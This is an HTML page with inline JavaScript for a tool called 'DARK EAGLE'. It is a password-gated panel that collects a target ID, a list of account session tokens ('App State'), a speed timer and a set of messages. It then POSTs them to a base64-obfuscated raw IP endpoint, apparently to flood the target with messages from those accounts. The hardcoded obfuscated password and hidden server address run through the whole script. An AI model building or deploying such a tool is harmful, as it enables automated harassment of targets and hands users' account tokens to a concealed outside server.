<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>DARK EAGLE</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      margin: 0;
      padding: 0;
      min-height: 120vh;
      background: none;
      overflow-y: auto;
    }
    .glass {
      background: rgba(255, 255, 255, 0.2);
      backdrop-filter: blur(0px);
    }
    .glass-input {
      background: rgba(255, 255, 255, 0.2);
      width: 100%;
      box-shadow: 0 -6px 12px 0 rgba(255, 255, 255, 0.8);
      border: 1px solid rgba(255, 255, 255, 0.6);
      transition: box-shadow 0.3s ease;
      outline: none;
      padding-left: 1rem;
      padding-right: 1rem;
    }
    .glass-input:focus {
      box-shadow: 0 -8px 16px 2px rgba(255, 255, 255, 1);
      border: 1px solid rgba(255, 255, 255, 1);
      outline: none;
    }
  </style>
</head>
<body class="relative bg-black p-4">
  <img src="https://i.ibb.co/kVYGwYVT/21a95ef69199972ebcd98e2e66b32f95.jpg" alt="Dark eagle soaring in a dramatic stormy sky" class="fixed inset-0 w-full h-full object-cover -z-10" />

  <div class="glass p-8 rounded-lg shadow-lg w-full max-w-lg mx-auto mt-16 mb-16 backdrop-blur-none">
    <h1 class="text-4xl sm:text-5xl font-bold mb-8 text-center text-red-600">DARK EAGLE</h1>

    <form id="taskForm" class="space-y-8">
      <div>
        <label for="targetid" class="block text-base sm:text-lg font-medium text-red-600">Target ID:</label>
        <input type="text" id="targetid" name="targetid" required class="glass-input mt-2 block rounded-md shadow-sm text-base sm:text-lg py-3">
      </div>
      <div>
        <label for="appstate" class="block text-base sm:text-lg font-medium text-red-600">App State (Access Token):</label>
        <textarea id="appstate" name="appstate" required rows="5" class="glass-input mt-2 block rounded-md shadow-sm text-base sm:text-lg py-3">["TOKEN1","TOKEN2"]</textarea>
      </div>
      <div>
        <label for="timer" class="block text-base sm:text-lg font-medium text-red-600">Timer (Speed):</label>
        <input type="number" id="timer" name="timer" required min="1" class="glass-input mt-2 block rounded-md shadow-sm text-base sm:text-lg py-3">
      </div>
      <div>
        <label for="msg" class="block text-base sm:text-lg font-medium text-red-600">Messages (JSON array):</label>
        <textarea id="msg" name="msg" required rows="5" class="glass-input mt-2 block rounded-md shadow-sm text-base sm:text-lg py-3">["MSG1","MSG2","MSG3"]</textarea>
      </div>
      <div>
        <label for="password" class="block text-base sm:text-lg font-medium text-red-600">Password:</label>
        <input type="password" id="password" name="password" required class="glass-input mt-2 block rounded-md shadow-sm text-base sm:text-lg py-3">
      </div>
      <button type="submit" class="w-full bg-indigo-600 text-white py-3 rounded-md shadow-lg hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 text-lg sm:text-xl flex items-center justify-center">
        <i class="fas fa-play mr-3"></i>Submit
      </button>
    </form>
  </div>

  <script>
    document.getElementById("taskForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      const targetid = document.getElementById("targetid").value.trim();
      const appstate = document.getElementById("appstate").value.trim();
      const timer = document.getElementById("timer").value.trim();
      const msg = document.getElementById("msg").value.trim();
      const password = document.getElementById("password").value.trim();

      const encodedPassword = "RUFHTEU="; // ""
      const encodedURL = "aHR0cDovLzE3Mi44MS4xMjkuMTgyOjIwMjk3L3N0YXJ0LXRhc2s=";
      const actualPassword = atob(encodedPassword);
      const endpointURL = atob(encodedURL);

      if (password !== actualPassword) {
        Swal.fire({
          icon: 'error',
          title: 'Invalid Password',
          text: 'Wrong password. Access denied.',
        });
        return;
      }

      let parsedAppstate, parsedMsg;
      try {
        parsedAppstate = JSON.parse(appstate);
        parsedMsg = JSON.parse(msg);
      } catch (err) {
        Swal.fire({
          icon: 'error',
          title: 'JSON Format Error',
          text: 'Ensure App State and Message fields are valid JSON arrays.',
        });
        return;
      }

      const data = {
        targetid: targetid,
        appstate: parsedAppstate,
        timer: timer,
        msg: parsedMsg
      };

      try {
        const res = await fetch(endpointURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        });

        const result = await res.json();

        if (result.success) {
          Swal.fire({
            icon: 'success',
            title: 'Success!',
            text: 'Your task has been submitted.',
          });
        } else {
          Swal.fire({
            icon: 'error',
            title: 'Failed',
            text: result?.message || 'Something went wrong with the task.',
          });
        }
      } catch (error) {
        Swal.fire({
          icon: 'error',
          title: 'Network Error',
          text: 'Something went wrong while submitting. Check your connection or try again.',
        });
      }
    });
  </script>
</body>
</html>
